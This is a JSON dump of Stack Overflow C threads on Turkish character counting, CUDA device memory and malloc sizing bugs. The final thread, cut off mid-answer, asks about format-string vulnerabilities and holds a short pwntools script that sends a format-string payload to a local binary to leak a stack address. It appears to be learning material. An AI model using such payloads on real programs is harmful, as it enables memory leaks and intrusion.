how to count two letters? bigram. i mean, bigram counts count the frequency of pairs of characters."}, {"owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "reply_to_user": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "edited": false, "score": 0, "creation_date": 1482955869, "post_id": 41354396, "comment_id": 69939625, "body": "@jekyll That should be a new question, but try searching for an answer before asking. Someone probably already asked a similar question."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "is_accepted": false, "score": 2, "last_activity_date": 1482939787, "last_edit_date": 1482939787, "creation_date": 1482890348, "answer_id": 41354396, "question_id": 41353844, "link": "https://stackoverflow.com/questions/41353844/counting-turkish-character-in-c/41354396#41354396", "title": "Counting Turkish character in C", "body": "<p>Since you are apparently working with a UTF-8 file, the answer will depend upon your execution platform:</p>\n\n<ol>\n<li><p>If you're on Linux, <code>setlocale(LC_CTYPE, \"en_US.UTF-8\")</code> or something similar should work, but the important part is the <code>UTF-8</code> at the end! The language shouldn't matter. You can verify it worked by using</p>\n\n<pre><code>if (setlocale(LC_CTYPE, \"en_US.UTF-8\") == NULL) {\n    abort();\n}\n</code></pre>\n\n<p>That will stop the program from executing. Anything after that code means that the locale was set correctly.</p></li>\n<li><p>If you're on Windows, you can instead open the file using <code>fopen(\"myfile.txt\", \"rt, ccs=UTF-8\")</code>. However, this isn't entirely portable to other platforms. It's a lot cleaner than the alternatives, however, which is likely more important in this particular case.</p></li>\n<li><p>If you're using FreeBSD or another system that doesn't allow you to use either approach (e.g. there are no <code>UTF-8</code> locales), you'd need to parse the bytes manually or use a library to convert them for you. If your implementation has an <code>iconv()</code> function, you might be able to use it to convert from UTF-8 to ISO-8859-9 to use your special characters as single bytes.</p></li>\n</ol>\n\n<p>Once you're ready to read the file, you can use <code>fgetws</code> with a <code>wchar_t</code> array.</p>\n\n<p>Another problem is checking if one of your non-ASCII characters was detected. You could do something like this:</p>\n\n<pre><code>// lower = \"abcdefghijklmnopqrstuvwxyz\u00e7\u00f6\u00fc\u011f\u0131\"\n// upper = \"ABCDEFGH\u0130JKLMNOPQRSTUVWXYZ\u00c7\u00d6\u00dc\u011eI\"\nconst wchar_t lower[] = L\"abcdefghijklmnopqrstuvwxyz\\u00E7\\u00F6\\u00FC\\u011F\\u0131\";\nconst wchar_t upper[] = L\"ABCDEFGH\\u0130JKLMNOPQRSTUVWXYZ\\u00C7\\u00D6\\u00DC\\u011EI\";\n\nconst wchar_t *lchptr = wcschr(lower, string[c]);\nconst wchar_t *uchptr = wcschr(upper, string[c]);\nif (lchptr) {\n    count[(size_t)(lchptr-lower)]++;\n    bahar++;\n} else if (uchptr) {\n    count[(size_t)(uchptr-upper)]++;\n    bahar++;\n}\n</code></pre>\n\n<p>That code assumes you're counting characters without regard for case (case insensitive). That is, <code>\u0131</code> (<code>\\u0131</code>) and <code>I</code> are considered the same character (<code>count[8]++</code>), just like <code>\u0130</code> (<code>\\u0130</code>) and <code>i</code> are considered the same (<code>count[29]++</code>). I won't claim to know much about the Turkish language, but I used what little I understand about Turkish casing rules when I created the uppercase and lowercase strings.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>As @JonathanLeffler mentioned in the question's comments, a better solution would be to use something like <code>isalpha</code> (or in this case, <code>iswalpha</code>) on each character in <code>string</code> instead of the <code>lower</code> and <code>upper</code> strings of valid characters I used. This, however, would only allow you to know that the character is an alphabetic character; it wouldn't tell you the index of your <code>count</code> array to use, and the truth is that there is no universal answer to do so because some languages use only a few characters with diacritic marks rather than an entire group where you can just do <code>string[c] >= L'&agrave;' &amp;&amp; string[c] &lt;= L'&ccedil;'</code>. In other words, even when you have read the data, you still need to convert it to fit your solution, and that requires knowledge of what you're working with to create a mapping from characters to integer values, which my code does by using strings of valid characters and the indices of each character in the string as the indices of the <code>count</code> array (i.e. <code>lower[29]</code> will mean <code>count[29]++</code> is executed, and <code>upper[18]</code> will mean <code>count[18]++</code> is executed).</p>\n"}], "owner": {"reputation": 41, "user_id": 5571199, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/afac0a6d48b7ba9ebe5475e9875f59cf?s=128&d=identicon&r=PG&f=1", "display_name": "jekyll", "link": "https://stackoverflow.com/users/5571199/jekyll"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1649, "favorite_count": 3, "answer_count": 3, "score": 1, "last_activity_date": 1482939787, "creation_date": 1482884666, "last_edit_date": 1482888137, "question_id": 41353844, "link": "https://stackoverflow.com/questions/41353844/counting-turkish-character-in-c", "title": "Counting Turkish character in C", "body": "<p>I'm trying to write a program that counts all the characters in a string at Turkish language. I can't see why this does not work. i added library, setlocale(LC_ALL,\"turkish\") but still doesn't work. Thank you. Here is my code:\nMy file character encoding: <strong>utf_8</strong></p>\n\n<pre><code>int main(){\n\n    setlocale(LC_ALL,\"turkish\");\n    char string[9000];\n    int c = 0, count[30] = {0};\n    int bahar = 0;    \n\n    ...\n        if ( string[c] &gt;= 'a' &amp;&amp; string[c] &lt;= 'z' ){\n            count[string[c]-'a']++;\n            bahar++;\n\n}\n</code></pre>\n\n<p>my output:</p>\n\n<p>a 0.085217\nb 0.015272\nc 0.022602\nd 0.035736\ne 0.110263\nf 0.029933\ng 0.015272\nh 0.053146\ni 0.071167\nk 0.010996\nl 0.047954\nm 0.025046\nn 0.095907\no 0.069334\np 0.013745\nq 0.002443\nr 0.053451\ns 0.073916\nt 0.095296\nu 0.036958\nv 0.004582\nw 0.019243\nx 0.001527\ny 0.010996</p>\n\n<p>This is English alphabet but i need this characters calculate too: \"\u011f,\u00fc,\u00e7,\u0131,\u00f6\" </p>\n"}, {"tags": ["c", "cuda"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482884880, "post_id": 41353787, "comment_id": 69909692, "body": "Read <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. We need to know how do you call <code>CopyArrayToGPU</code>. Probably <code>DeviceArray</code> that is locale to your function."}, {"owner": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482885638, "post_id": 41353787, "comment_id": 69909840, "body": "I have included some more code in my question and I believe that it is sufficient to answer whether or not I am calling the function correctly."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482885814, "post_id": 41353787, "comment_id": 69909877, "body": "What is <code>ImageSize</code>, <code>NUM_INPUTS</code> and <code>NUM_ROWS</code>? Why to you cast return of malloc in C? What is the output of your program with your <code>printf()</code>? Does it show &quot;CopyArrayToGPU(): Couldn&#39;t allocate mem for array on GPU.&quot; or/and &quot;CopyArrayToGPU(): Couldn&#39;t copy host array to GPU.&quot;?"}, {"owner": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482886205, "post_id": 41353787, "comment_id": 69909950, "body": "As I said the program works without error except that the correct values don&#39;t get written to the GPU (as in HostArray).  I get -6277438562....  instead."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482886478, "post_id": 41353787, "comment_id": 69910004, "body": "You said &quot;My CUDA program still executes however&quot; you don&#39;t say they are no error. Whatever I think that my answer will fix your problem. Note that I can&#39;t test so maybe this will not work."}], "answers": [{"comments": [{"owner": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "edited": false, "score": 0, "creation_date": 1482887479, "post_id": 41353997, "comment_id": 69910165, "body": "Thankyou, this is a big help.  But when you say return the value allocated by cuda what does that mean?  Is that from cudaMalloc?"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "edited": false, "score": 1, "creation_date": 1482887856, "post_id": 41353997, "comment_id": 69910222, "body": "@PaulMatthews <a href=\"https://www.cs.cmu.edu/afs/cs/academic/class/15668-s11/www/cuda-doc/html/group__CUDART__MEMORY_gc63ffd93e344b939d6399199d8b12fef.html\" rel=\"nofollow noreferrer\"><code>cudaMalloc</code></a> allocate memory in <code>DeviceArray</code> your function need to return the value... You should read some book of C this is basic."}, {"owner": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "edited": false, "score": 0, "creation_date": 1482888026, "post_id": 41353997, "comment_id": 69910251, "body": "Yes I have not spent much time with C.  I believe that void *DeviceArray should be double *DeviceArray to be correct return type."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "edited": false, "score": 0, "creation_date": 1482888216, "post_id": 41353997, "comment_id": 69910279, "body": "@PaulMatthews I declare it with <code>void *</code> because I don&#39;t want to cast. You dont use <code>DeviceArray</code> as <code>double *</code> in the function <code>CopyArrayToGPU</code>. It&#39;s a choice they are many other way."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": true, "score": 2, "last_activity_date": 1482888256, "last_edit_date": 1482888256, "creation_date": 1482886235, "answer_id": 41353997, "question_id": 41353787, "link": "https://stackoverflow.com/questions/41353787/cuda-copying-arrays-to-gpu/41353997#41353997", "title": "CUDA: Copying arrays to GPU", "body": "<p>Your variable <code>DeviceArray</code> is <strong>locale</strong> to your function.</p>\n\n<p>You must take a <code>double **DeviceArray</code> as argument or return the value that have been allocate by cuda.</p>\n\n<p>Return value version:</p>\n\n<pre><code>double *CopyArrayToGPU(double *HostArray, int NumElements)\n{\n    int bytes = sizeof(double) * NumElements;\n    void *DeviceArray;\n\n    // Allocate memory on the GPU for array\n    if (cudaMalloc(&amp;DeviceArray, bytes) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't allocate mem for array on GPU.\");\n        return NULL;\n    }\n\n    // Copy the contents of the host array to the GPU\n    if (cudaMemcpy(DeviceArray, HostArray, bytes, cudaMemcpyHostToDevice) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't copy host array to GPU.\");\n        cudaFree(DeviceArray);\n        return NULL;\n    }\n\n    return DeviceArray;\n}\n</code></pre>\n\n<p>So you must call it like:</p>\n\n<pre><code>d_Inputs = CopyArrayToGPU(testArray, NUM_INPUTS * NUM_ROWS);\n</code></pre>\n\n<hr>\n\n<p><code>double **DeviceArray</code> as argument version:</p>\n\n<pre><code>int CopyArrayToGPU(double **DeviceArray, double *HostArray, int NumElements)\n{\n    int bytes = sizeof(double) * NumElements;\n\n    // Allocate memory on the GPU for array\n    if (cudaMalloc((void **)DeviceArray, bytes) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't allocate mem for array on GPU.\");\n        return 1;\n    }\n\n    // Copy the contents of the host array to the GPU\n    if (cudaMemcpy(*DeviceArray, HostArray, bytes, cudaMemcpyHostToDevice) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't copy host array to GPU.\");\n        cudaFree(*DeviceArray);\n        return 1;\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>So you must call it like:</p>\n\n<pre><code>CopyArrayToGPU(&amp;d_Inputs, testArray, NUM_INPUTS * NUM_ROWS);\n</code></pre>\n"}], "owner": {"reputation": 2006, "user_id": 445894, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/952e49a2305db81f023dfb2d45efc512?s=128&d=identicon&r=PG", "display_name": "Paul Matthews", "link": "https://stackoverflow.com/users/445894/paul-matthews"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1451, "favorite_count": 0, "accepted_answer_id": 41353997, "answer_count": 1, "score": -2, "last_activity_date": 1483087611, "creation_date": 1482884087, "last_edit_date": 1483087611, "question_id": 41353787, "link": "https://stackoverflow.com/questions/41353787/cuda-copying-arrays-to-gpu", "title": "CUDA: Copying arrays to GPU", "body": "<p>I am trying to create a function which allocates and copies values to an array on the device.  For some reason the code works fine inline but not when I put it in a function as follows.  Am I passing the parameters correctly?</p>\n\n<p>My CUDA program still executes (without error) however if I read back the values I have written they seem to be undefined ie. not the original values from HostArray.</p>\n\n<pre><code>void CopyArrayToGPU(double *DeviceArray, double *HostArray, int NumElements)\n{\n    int bytes = sizeof(double) * NumElements;\n\n    // Allocate memory on the GPU for array\n    if (cudaMalloc((void**)&amp;DeviceArray, bytes) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't allocate mem for array on GPU.\");\n    }\n\n    // Copy the contents of the host array to the GPU\n    if (cudaMemcpy(DeviceArray, HostArray, bytes, cudaMemcpyHostToDevice) != cudaSuccess)\n    {\n        printf(\"CopyArrayToGPU(): Couldn't copy host array to GPU.\");\n    }\n}\n\n// Declare device side array\nstatic double *d_Inputs;\n\n// Allocate host side array and plug in some test values\ndouble *testArray = (double*)malloc(ImageSize);\ntestArray[0] = 0.6455696203; testArray[1] = 0.7954545455; testArray[2] = 0.2028985507; testArray[3] = 0.08;\n\nCopyArrayToGPU(d_Inputs, testArray, NUM_INPUTS * NUM_ROWS);\n</code></pre>\n"}, {"tags": ["c", "memory", "crash", "malloc"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1482882353, "post_id": 41353546, "comment_id": 69909209, "body": "Wrong size allocated.  <code>SPPoint* point = malloc(sizeof(SPPoint*));</code> --&gt; <code>SPPoint* point = malloc(sizeof *point);</code>  Same for <code>point-&gt;data = malloc(sizeof *(point-&gt;data));</code>"}, {"owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482882651, "post_id": 41353546, "comment_id": 69909258, "body": "Thanks alot, seems to be working now!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482883082, "post_id": 41353546, "comment_id": 69909345, "body": "Other issues exist too."}], "answers": [{"comments": [{"owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482882775, "post_id": 41353612, "comment_id": 69909283, "body": "Fixed the first one. Regarding the second one, the data array given to the function is of size dim."}, {"owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482882850, "post_id": 41353612, "comment_id": 69909300, "body": "Won&#39;t let me edit : Fixed the first one. Regarding the second one, the data array given to the function is of size dim. I think point-&gt;data = malloc(dim * sizeof(double)); is what you were thinking? Thanks for the answer"}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "reply_to_user": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482882922, "post_id": 41353612, "comment_id": 69909309, "body": "@Bar yes that is it. You have to allocate <code>dim</code> doubles"}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "reply_to_user": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482883074, "post_id": 41353612, "comment_id": 69909343, "body": "@Bar notice that even if the givendata  array has size <code>dim</code>, the <code>sizeof</code> function cannot know it inside the function, because it is given simply as a pointer."}, {"owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482883217, "post_id": 41353612, "comment_id": 69909370, "body": "I see, so what you meant is that sizeof simply gives me the size of a double"}, {"owner": {"reputation": 5542, "user_id": 1076451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZTP3Q.jpg?s=128&g=1", "display_name": "Chimera", "link": "https://stackoverflow.com/users/1076451/chimera"}, "edited": false, "score": 0, "creation_date": 1482883283, "post_id": 41353612, "comment_id": 69909394, "body": "Also, it&#39;s not a great idea to cast the return of <code>malloc()</code>. <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\" title=\"do i cast the result of malloc\">stackoverflow.com/questions/605845/&hellip;</a>"}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "reply_to_user": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482883327, "post_id": 41353612, "comment_id": 69909402, "body": "@Bar <code>sizeof(data)</code> will give you the size of a pointer (4 or 8 bytes according to platform) and  <code>sizeof(*data)</code> will give you the size of a double."}, {"owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "edited": false, "score": 0, "creation_date": 1482967739, "post_id": 41353612, "comment_id": 69944015, "body": "Regarding the same topic, say I want to change the following code line: ( SPPoint*  parr [n]; ) to a malloc &#39;form&#39; , like above. I think this is the correct way and it the program runs but I can&#39;t justify it. Can anyone explain? (      SPPoint**  parr = malloc (n * sizeof(SPPoint*));    )  thanks!"}], "tags": [], "owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "is_accepted": true, "score": 3, "last_activity_date": 1482882546, "creation_date": 1482882546, "answer_id": 41353612, "question_id": 41353546, "link": "https://stackoverflow.com/questions/41353546/code-crashes-on-c-most-likely-something-to-do-with-malloc/41353612#41353612", "title": "Code crashes on c, most likely something to do with malloc?", "body": "<blockquote>\n  <p><code>SPPoint* point = malloc(sizeof(SPPoint*));</code></p>\n</blockquote>\n\n<p>should be: <code>struct SPPoint* point = malloc(sizeof(*point));</code></p>\n\n<blockquote>\n  <p><code>point-&gt;data = (double*) malloc(sizeof(data));</code></p>\n</blockquote>\n\n<p>should be <code>point-&gt;data = malloc(dim * sizeof(*point-&gt;data));</code>\nsince you want to allocate <code>dim</code> doubles for your point.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1482883372, "last_edit_date": 1482883372, "creation_date": 1482882737, "answer_id": 41353636, "question_id": 41353546, "link": "https://stackoverflow.com/questions/41353546/code-crashes-on-c-most-likely-something-to-do-with-malloc/41353636#41353636", "title": "Code crashes on c, most likely something to do with malloc?", "body": "<p>Code is mis-allocating in 2 places</p>\n\n<pre><code>// Bad\nSPPoint* spPointCreate(double* data, int dim, int index){\n  SPPoint* point = malloc(sizeof(SPPoint*));  // allocate the size of a pointer\n  ...\n  point-&gt;data = (double*) malloc(sizeof(data)); // allocate the size of a pointer\n</code></pre>\n\n<p>Instead avoid mis-coding the type and allocate to the the size of the de-referenced variable. </p>\n\n<p>Also need to allocate <code>N</code> objects.</p>\n\n<pre><code>SPPoint* spPointCreate(double* data, int dim, int index){\n  size_t N = 1;\n  SPPoint* point = malloc(sizeof *point * N);// allocate the size of `*point` * N\n\n  ...\n  assert(dim &gt;= 0);\n  N = dim;\n  point-&gt;data = malloc(sizeof *(point-&gt;data) * N);\n</code></pre>\n\n<p>BTW, casting the result of <code>malloc()</code> not needed.  </p>\n\n<p>2nd allocation would benefit with a <code>NULL</code> check.  More complicated as <code>dim</code> may be 0 and a <code>malloc()</code> return of <code>NULL</code> in that case is OK.</p>\n\n<pre><code>  N = dim;\n  point-&gt;data = malloc(sizeof *(point-&gt;data) * N);\n  if (point-&gt;data == NULL &amp;&amp; N &gt; 0) {\n    free(point);\n    return NULL;\n  }\n</code></pre>\n"}], "owner": {"reputation": 186, "user_id": 5683968, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2f58b2be757494b41047b7bd4bbe3a36?s=128&d=identicon&r=PG&f=1", "display_name": "Bar", "link": "https://stackoverflow.com/users/5683968/bar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 231, "favorite_count": 0, "accepted_answer_id": 41353612, "answer_count": 2, "score": 3, "last_activity_date": 1482883557, "creation_date": 1482882027, "last_edit_date": 1482883557, "question_id": 41353546, "link": "https://stackoverflow.com/questions/41353546/code-crashes-on-c-most-likely-something-to-do-with-malloc", "title": "Code crashes on c, most likely something to do with malloc?", "body": "<p>this is quite basic but I've been trying to solve it for a few hours now with no success. This code is supposed to read 3 ints from user input and then, points according to the ints (n = how many, d = dimension, k is unrelated to this part) and create an array of them. For some reason it crashes on the second loop, where it fails to create the second point, but im not sure why. I think it might has something to do with malloc but I'm totally lost, would appreciate any help. </p>\n\n<p>I inserted the input :</p>\n\n<pre><code>5 3 2 \n1.2 3.4 0.1\n</code></pre>\n\n<p>2 times before it crashed.</p>\n\n<p>Code is below:</p>\n\n<pre><code>int main(){\n\n    double* pdata;\n    int n,d,k;\n    scanf(\"%d %d %d\",&amp;n,&amp;d,&amp;k );\n    SPPoint*  parr [n];\n    for(int i=0; i&lt;n; i++)\n    {\n        double darr [d];\n        for(int j = 0; j &lt; d-1; j++)\n        {\n            scanf(\" %lf\", &amp;darr[j]);\n        }\n        scanf(\" %lf\", &amp;darr[d-1]);\n    pdata = darr;\n    parr[i] = spPointCreate(pdata, d, i); \n    }\n}\n</code></pre>\n\n<p>This is the code for the spPointCreate function:</p>\n\n<pre><code>struct sp_point_t{\ndouble* data;\nint dim;\nint index;\n};\n\nSPPoint* spPointCreate(double* data, int dim, int index){\nSPPoint* point = malloc(sizeof(SPPoint*));\nif(point == NULL)\n{\n    return NULL;\n}\npoint-&gt;data = (double*) malloc(sizeof(data));\nfor( int i=0 ; i&lt;dim ; i++)\n{\n    point-&gt;data[i] = data[i];\n}\npoint-&gt;dim = dim;\npoint-&gt;index = index;\nreturn point;\n}\n</code></pre>\n"}, {"tags": ["c", "security", "string-formatting"], "comments": [{"owner": {"reputation": 37, "user_id": 6106709, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a022b4e6855e4b9999a8cfdba42e452?s=128&d=identicon&r=PG&f=1", "display_name": "yeahservice", "link": "https://stackoverflow.com/users/6106709/yeahservice"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482887414, "post_id": 41353503, "comment_id": 69910150, "body": "I added the code, did not really think that it is necessary for the question."}], "answers": [{"tags": [], "owner": {"reputation": 321, "user_id": 4446356, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5fUXH.jpg?s=128&g=1", "display_name": "bananaappletw", "link": "https://stackoverflow.com/users/4446356/bananaappletw"}, "is_accepted": true, "score": 1, "last_activity_date": 1483020228, "last_edit_date": 1483020228, "creation_date": 1483000159, "answer_id": 41375819, "question_id": 41353503, "link": "https://stackoverflow.com/questions/41353503/c-format-string-vulnerability-how-to-get-address-in-buffer/41375819#41375819", "title": "C Format-String vulnerability, how to get address in buffer", "body": "<p>Happy to see people ask about security question here.\nI think you could take a look of <a href=\"https://github.com/Gallopsled/pwntools\" rel=\"nofollow noreferrer\">pwntools</a>.</p>\n\n<p>This is a tool for writing exploit.\nHere is a simple code snippet.</p>\n\n<pre><code>#!/usr/bin/env python2\nfrom pwn import *\n# a.out is your executable file\ns = process('./a.out')\npayload = p32(0xbffff0fc)+\"%7$p\"\n# p32() is a function to pack your integer in little endian order\ns.sendline(payload)\ns.interactive()\n</code></pre>\n\n<p>The output will be some unprintable characters plus <code>0xbffff0fc</code></p>\n\n<p><code>\u2592\u25920xbffff0fc</code></p>\n\n<p>For further explanation, <code>line</code> variable is already on stack.\nBut you have to disable the <a 